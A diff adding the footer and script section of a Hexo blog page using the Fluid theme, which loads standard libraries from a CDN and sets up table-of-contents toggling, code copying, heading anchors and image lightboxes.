+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
